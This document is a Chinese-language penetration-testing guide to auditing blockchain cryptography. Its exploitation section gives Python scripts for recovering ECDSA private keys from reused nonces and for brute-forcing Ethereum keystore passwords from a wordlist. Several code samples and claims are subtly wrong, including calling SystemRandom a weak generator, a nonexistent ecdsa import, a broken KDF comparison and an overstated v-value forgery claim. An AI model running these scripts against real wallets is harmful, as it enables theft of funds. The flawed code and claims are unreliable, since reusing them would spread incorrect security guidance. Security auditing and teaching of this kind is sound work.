# 区块链加密审计

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供区块链系统加密审计的方法论。通过本指南，测试人员可以评估区块链应用、智能合约、钱包系统的加密实现安全性。

### 1.2 适用范围
本文档适用于以下场景：
- 加密货币钱包安全审计
- 智能合约加密逻辑审查
- 区块链节点通信加密评估
- DApp 加密实现测试
- 交易所密钥管理审计

### 1.3 读者对象
- 区块链安全测试人员
- 智能合约审计师
- 渗透测试工程师
- 加密货币安全研究员

---

## 第二部分：核心渗透技术专题

### 专题一：区块链加密审计

#### 2.1 技术介绍

**区块链加密审计**是对区块链系统中使用的加密技术进行全面评估，包括密钥管理、交易签名、通信加密、智能合约安全等方面。

**区块链加密核心组件：**

| 组件 | 加密技术 | 风险点 |
|------|---------|--------|
| 地址生成 | 椭圆曲线加密 (ECDSA/EdDSA) | 弱随机数导致私钥泄露 |
| 交易签名 | 数字签名 (ECDSA/Ed25519) | 签名重用、随机数泄露 |
| 钱包加密 | 对称加密 (AES-256) | 弱口令、弱密钥派生 |
| 节点通信 | TLS/P2P 加密 | 中间人攻击 |
| 智能合约 | 哈希函数、签名验证 | 重放攻击、签名伪造 |
| 共识机制 | 密码学证明 | 加密算法漏洞 |

#### 2.2 审计常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 加密货币钱包 | 私钥存储、交易签名 | 私钥泄露导致资金损失 |
| 去中心化交易所 | 链上交易、流动性池 | 智能合约漏洞 |
| NFT 平台 | 铸币、交易 | 签名验证缺陷 |
| DeFi 协议 | 借贷、质押 | 重入攻击、签名重放 |
| 跨链桥 | 资产跨链转移 | 签名验证绕过 |
| 托管服务 | 多签钱包、冷存储 | 密钥管理不当 |

#### 2.3 漏洞检测方法

##### 2.3.1 钱包加密检测

```bash
# 检查钱包文件加密
# Bitcoin Core wallet.dat
file ~/.bitcoin/wallet.dat

# Ethereum keystore 文件
ls -la ~/.ethereum/keystore/
cat ~/.ethereum/keystore/UTC--* | jq

# 检查加密算法
# Ethereum keystore 使用 scrypt 或 PBKDF2
```

```python
#!/usr/bin/env python3
"""
钱包文件加密分析
"""
import json
import os

def analyze_ethereum_keystore(keystore_path):
    """分析 Ethereum keystore 文件"""
    with open(keystore_path, 'r') as f:
        keystore = json.load(f)
    
    print(f"[*] Keystore 分析")
    print(f"    版本：{keystore.get('version')}")
    print(f"    ID: {keystore.get('id')}")
    
    crypto = keystore.get('crypto', {})
    
    # 检查 KDF
    kdf = crypto.get('kdf', {})
    print(f"    KDF: {kdf.get('function')}")
    print(f"    参数：{kdf.get('params')}")
    
    # 检查加密算法
    cipher = crypto.get('cipher', {})
    print(f"    加密算法：{cipher.get('name')}")
    
    # 风险评估
    if kdf.get('function') == 'pbkdf2':
        params = kdf.get('params', {})
        if params.get('c', 0) < 100000:
            print("[!] 警告：PBKDF2 迭代次数过低")
    
    if kdf.get('function') == 'scrypt':
        params = kdf.get('params', {})
        if params.get('n', 0) < 262144:
            print("[!] 警告：scrypt N 值过低")

# 使用示例
# analyze_ethereum_keystore("UTC--2023-01-01T00-00-00.000000000Z--abc123")
```

##### 2.3.2 智能合约签名验证检测

```solidity
// ❌ 不安全 - 缺少重放保护
function verifySignature(address user, bytes32 hash, bytes memory signature) public pure returns (bool) {
    bytes32 r;
    bytes32 s;
    uint8 v;
    assembly {
        r := mload(add(signature, 0x20))
        s := mload(add(signature, 0x40))
        v := byte(0, mload(add(signature, 0x60)))
    }
    return ecrecover(hash, v, r, s) == user;
}

// ✅ 安全 - 使用 nonce 防止重放
mapping(address => uint256) public nonces;

function verifySignatureWithNonce(
    address user,
    bytes32 hash,
    uint256 nonce,
    bytes memory signature
) public returns (bool) {
    require(nonce == nonces[user], "Invalid nonce");
    require(verifySignature(user, hash, signature), "Invalid signature");
    nonces[user]++;  // 递增 nonce
    return true;
}
```

##### 2.3.3 私钥生成检测

```python
#!/usr/bin/env python3
"""
检测弱随机数生成的私钥
"""
import random
import hashlib
from ecdsa import SigningCurve, SECP256k1

def weak_random_private_key():
    """演示弱随机数生成的私钥"""
    
    # ❌ 不安全 - 使用普通 PRNG
    weak_random = random.SystemRandom()
    private_key = weak_random.getrandbits(256)
    
    print(f"[!] 弱随机生成的私钥：{hex(private_key)}")
    print("[!] 这种私钥可能被预测")
    
    # ✅ 安全 - 使用加密安全的随机数
    import secrets
    secure_private_key = secrets.randbits(256)
    print(f"[+] 安全随机生成的私钥：{hex(secure_private_key)}")

# 检测已知的弱随机数攻击
# - Android SecureRandom 漏洞 (2013)
# - 区块链钱包随机数生成缺陷
```

##### 2.3.4 节点通信加密检测

```bash
# 检测 Ethereum 节点 RPC 加密
curl -X POST https://mainnet.infura.io/v3/YOUR_PROJECT_ID \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}'

# 检测本地节点是否启用加密
# Geth 配置检查
cat ~/.ethereum/geth.toml | grep -i "tls\|ssl\|encrypt"

# 检查 RPC 是否暴露
nmap -p 8545,8546 target_node

# 检查 WebSocket 是否加密
wscat -c wss://target-node:8546
```

#### 2.4 漏洞利用方法

##### 2.4.1 弱随机数私钥提取

```python
#!/usr/bin/env python3
"""
利用弱随机数提取私钥
"""
import random
import hashlib

def attack_weak_random_signature():
    """
    攻击使用弱随机数生成的 ECDSA 签名
    
    如果两个签名使用相同的 k 值（随机数），可以提取私钥
    """
    
    # 假设截获了两个使用相同 k 值的签名
    # 签名 1: (r, s1, z1)
    # 签名 2: (r, s2, z2)
    # 注意：r 相同表示 k 相同
    
    r = 0x1234567890abcdef
    s1 = 0xabcdef1234567890
    z1 = 0x1111111111111111
    s2 = 0xfedcba0987654321
    z2 = 0x2222222222222222
    
    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141  # secp256k1 阶
    
    # 计算 k
    # s1 = k^-1 * (z1 + r * private_key) mod n
    # s2 = k^-1 * (z2 + r * private_key) mod n
    # s1 - s2 = k^-1 * (z1 - z2) mod n
    # k = (z1 - z2) / (s1 - s2) mod n
    
    s_diff = (s1 - s2) % n
    z_diff = (z1 - z2) % n
    
    # 模逆
    k = (z_diff * pow(s_diff, -1, n)) % n
    
    # 计算私钥
    # private_key = (s * k - z) / r mod n
    private_key = ((s1 * k - z1) * pow(r, -1, n)) % n
    
    print(f"[+] 提取的私钥：{hex(private_key)}")
    
    # 这是 2013 年 Android 钱包漏洞的原理
```

##### 2.4.2 签名重放攻击

```python
#!/usr/bin/env python3
"""
签名重放攻击演示
"""
from web3 import Web3

def replay_attack_demo():
    """
    演示签名重放攻击
    
    场景：用户在链 A 签名提现，攻击者在链 B 重放
    """
    
    # 假设的签名数据
    signed_message = {
        'from': '0xUserAddress',
        'amount': 1000,
        'nonce': 1,
        'signature': '0x1234567890abcdef...'
    }
    
    # ❌ 不安全 - 没有链 ID 检查
    # 攻击者可以在多条链上重放此签名
    
    # ✅ 安全 - 包含链 ID 和合约地址
    safe_message = {
        'from': '0xUserAddress',
        'amount': 1000,
        'nonce': 1,
        'chainId': 1,  # Ethereum Mainnet
        'contract': '0xContractAddress',
        'signature': '0x1234567890abcdef...'
    }
    
    print("[!] 重放攻击风险：签名未绑定特定链/合约")
    print("[+] 修复方案：在签名数据中包含 chainId 和合约地址")

# 实际攻击需要部署到测试网
```

##### 2.4.3 钱包口令爆破

```python
#!/usr/bin/env python3
"""
钱包口令爆破攻击
"""
import json
from eth_account import Account
from py_eth_sig_utils import keccak

def bruteforce_keystore(keystore_path, wordlist):
    """爆破 Ethereum keystore 口令"""
    
    with open(keystore_path, 'r') as f:
        keystore = json.load(f)
    
    crypto = keystore['crypto']
    ciphertext = bytes.fromhex(crypto['ciphertext'])
    
    kdf = crypto['kdf']
    kdf_params = kdf['params']
    
    with open(wordlist, 'r') as wl:
        for password in wl:
            password = password.strip()
            
            # 派生密钥
            if kdf == 'pbkdf2':
                from Crypto.Protocol.KDF import PBKDF2
                derived_key = PBKDF2(
                    password,
                    bytes.fromhex(kdf_params['salt']),
                    dkLen=32,
                    count=kdf_params['c']
                )
            elif kdf == 'scrypt':
                from Crypto.Protocol.KDF import scrypt
                derived_key = scrypt(
                    password,
                    bytes.fromhex(kdf_params['salt']),
                    keyLen=32,
                    N=kdf_params['n'],
                    r=kdf_params['r'],
                    p=kdf_params['p']
                )
            else:
                continue
            
            # 尝试解密
            from Crypto.Cipher import AES
            cipher = AES.new(derived_key[:16], AES.MODE_CTR, 
                           counter=lambda: int.from_bytes(
                               bytes.fromhex(crypto['cipherparams']['iv']), 'big'))
            
            try:
                plaintext = cipher.decrypt(ciphertext)
                
                # 验证密钥（检查 MAC）
                mac = keccak(derived_key[16:32] + plaintext)
                if mac.hex() == crypto['mac']:
                    print(f"[+] 找到口令：{password}")
                    return password
            except:
                continue
    
    print("[-] 未找到口令")
    return None

# 使用示例
# bruteforce_keystore("keystore_file", "rockyou.txt")
```

##### 2.4.4 智能合约签名验证绕过

```solidity
// 漏洞合约示例
contract VulnerableSignature {
    address public owner;
    
    function verifyAndExecute(
        address signer,
        bytes32 message,
        bytes memory signature
    ) public {
        require(verify(signer, message, signature), "Invalid signature");
        
        // 执行敏感操作
        executeAction(message);
    }
    
    function verify(address signer, bytes32 message, bytes memory signature)
        public pure returns (bool)
    {
        bytes32 hash = keccak256(abi.encodePacked(message));
        
        (uint8 v, bytes32 r, bytes32 s) = splitSignature(signature);
        
        // ❌ 漏洞：未检查 v 值范围
        // 攻击者可以修改 v 值伪造签名
        return ecrecover(hash, v, r, s) == signer;
    }
    
    // ✅ 修复：检查 v 值
    function verifyFixed(address signer, bytes32 message, bytes memory signature)
        public pure returns (bool)
    {
        require(signature.length == 65, "Invalid signature length");
        
        bytes32 hash = keccak256(abi.encodePacked(message));
        
        (uint8 v, bytes32 r, bytes32 s) = splitSignature(signature);
        
        // 检查 v 值
        require(v == 27 || v == 28, "Invalid v value");
        
        // 检查 s 值（防止 malleability）
        require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, "Invalid s value");
        
        return ecrecover(hash, v, r, s) == signer;
    }
}
```

#### 2.5 安全配置建议

##### 2.5.1 钱包安全最佳实践

```
私钥存储：
- 使用硬件钱包（Ledger、Trezor）
- 冷存储离线生成
- 多签钱包分散风险
- 助记词物理备份

口令保护：
- 使用强口令（16+ 字符）
- 启用口令强度检查
- 使用密码管理器
- 启用 2FA

传输安全：
- 仅使用 HTTPS RPC
- 验证节点证书
- 不通过明文传输私钥
```

##### 2.5.2 智能合约签名安全

```solidity
// 安全签名验证模板
contract SecureSignature {
    using ECDSA for bytes32;
    
    // EIP-191 个人签名
    function verifyPersonalSign(
        address signer,
        string memory message,
        bytes memory signature
    ) public pure returns (bool) {
        bytes32 hash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n", 
                                                   uint2str(bytes(message).length), 
                                                   message)).toEthSignedMessageHash();
        return hash.recover(signature) == signer;
    }
    
    // EIP-712 结构化签名
    function verifyEIP712(
        address signer,
        bytes32 structHash,
        bytes memory signature
    ) public pure returns (bool) {
        bytes32 digest = keccak256(abi.encodePacked(
            "\x19\x01",
            DOMAIN_SEPARATOR,
            structHash
        ));
        return digest.recover(signature) == signer;
    }
    
    // 防止重放
    mapping(address => uint256) public nonces;
    mapping(bytes32 => bool) public usedHashes;
    
    function verifyWithNonce(
        address signer,
        bytes32 message,
        uint256 nonce,
        bytes memory signature
    ) public returns (bool) {
        require(nonce == nonces[signer], "Invalid nonce");
        
        bytes32 hash = keccak256(abi.encodePacked(message, nonce));
        require(!usedHashes[hash], "Signature reused");
        
        require(hash.recover(signature) == signer, "Invalid signature");
        
        nonces[signer]++;
        usedHashes[hash] = true;
        
        return true;
    }
}
```

##### 2.5.3 区块链加密检查清单

**钱包安全:**
- [ ] 私钥加密存储（AES-256）
- [ ] 强 KDF（scrypt/PBKDF2 高迭代）
- [ ] 口令强度要求
- [ ] 助记词备份
- [ ] 硬件钱包支持

**智能合约:**
- [ ] EIP-191/EIP-712 签名
- [ ] 重放保护（nonce）
- [ ] 链 ID 检查
- [ ] 签名 malleability 检查
- [ ] 时间戳/过期检查

**节点通信:**
- [ ] TLS 加密 RPC
- [ ] 证书验证
- [ ] 访问控制
- [ ] 速率限制
- [ ] WebSocket 加密

---

## 第三部分：附录

### 3.1 区块链安全工具

| 工具 | 用途 |
|-----|------|
| Mythril | 智能合约安全分析 |
| Slither | Solidity 静态分析 |
| Echidna | 智能合约模糊测试 |
| Manticore | 符号执行工具 |
| web3.py | Ethereum 交互 |

### 3.2 常见区块链加密漏洞

| 漏洞 | 影响 | 案例 |
|-----|------|------|
| 弱随机数 | 私钥泄露 | Android 钱包漏洞 |
| 签名重放 | 资金被盗 | 跨链重放攻击 |
| 签名 malleability | 交易篡改 | Mt.Gox 事件 |
| 重入攻击 | 资金耗尽 | The DAO 事件 |
| 整数溢出 | 计算错误 | BeautyChain |

---

## 参考资源

- [EIP-191: Signed Data Standard](https://eips.ethereum.org/EIPS/eip-191)
- [EIP-712: Typed Structured Data Hashing](https://eips.ethereum.org/EIPS/eip-712)
- [OWASP Blockchain Security](https://owasp.org/www-project-blockchain-security/)
- [ConsenSys Smart Contract Best Practices](https://consensys.github.io/smart-contract-best-practices/)
